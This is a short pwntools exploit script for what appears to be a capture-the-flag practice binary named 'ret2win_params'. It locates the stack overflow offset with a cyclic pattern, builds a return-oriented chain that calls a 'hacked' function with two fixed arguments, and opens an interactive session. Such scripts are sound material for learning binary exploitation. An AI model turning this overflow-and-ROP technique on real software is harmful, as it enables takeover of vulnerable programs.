from pwn import *

def find_ip(payload):
    p=process(exe)
    p.sendlineafter(b':',payload)
    p.wait()
    ip_offset=cyclic_find(p.corefile.pc)
    return ip_offset

exe='./ret2win_params'

context.binary = elf = ELF(exe)

test=cyclic(200)

offset=find_ip(test)

rop=ROP(elf)

rop.hacked(0xdeadbeef,0xc0debabe)

payload = flat(
{
    offset: rop.chain()
}
)

io = elf.process()

io.sendlineafter(b':',payload)
io.interactive()

